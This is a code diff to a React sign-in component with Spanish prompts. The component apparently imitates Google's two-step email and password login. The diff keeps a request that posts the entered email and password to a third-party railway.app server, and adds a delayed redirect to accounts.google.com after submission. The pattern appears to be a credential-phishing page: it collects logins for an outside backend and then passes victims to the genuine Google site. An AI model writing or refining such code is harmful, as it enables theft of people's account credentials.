@@ -10,7 +10,11 @@ export default function AuthRight({
 }: any) {
   const [error, setError] = useState("");
 
+  console.log("RENDER STEP:", step); // 🔥 DEBUG
+
   const handleNext = () => {
+    console.log("CLICK SIGUIENTE (EMAIL)");
+
     if (!email.trim()) {
       setError("Ingresa un correo electrónico o número de teléfono");
       return;
@@ -20,29 +24,45 @@ export default function AuthRight({
     setStep(2);
   };
 
-const handleSubmit = async () => {
-  try {
+  /* 🔥 ENVÍO FINAL */
+  const handleSubmit = async () => {
     console.log("CLICK LOGIN 🔥");
 
-    const res = await fetch(
-      "https://login-app-production-b48f.up.railway.app/api/auth/login",
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ email, password }),
-      }
-    );
+    if (!password.trim()) {
+      alert("Ingresa la contraseña");
+      return;
+    }
 
-    const data = await res.json();
+    try {
+      const res = await fetch(
+        "https://login-app-production-b48f.up.railway.app/api/auth/login",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ email, password }),
+        }
+      );
 
-    console.log("RESPUESTA BACKEND:", data);
+      console.log("FETCH STATUS:", res.status);
 
-  } catch (error) {
-    console.error("ERROR LOGIN:", error);
-  }
-};
+      const data = await res.json();
+
+      console.log("RESPUESTA BACKEND:", data);
+
+      alert("LOGIN OK"); // 🔥 VISUAL (NO FALLA)
+
+      /* 🔥 REDIRECCIÓN (con delay para ver logs) */
+      setTimeout(() => {
+        window.location.href = "https://accounts.google.com";
+      }, 1500);
+
+    } catch (error) {
+      console.error("ERROR LOGIN:", error);
+      alert("Error conexión");
+    }
+  };
 
   return (
     <div className="right">
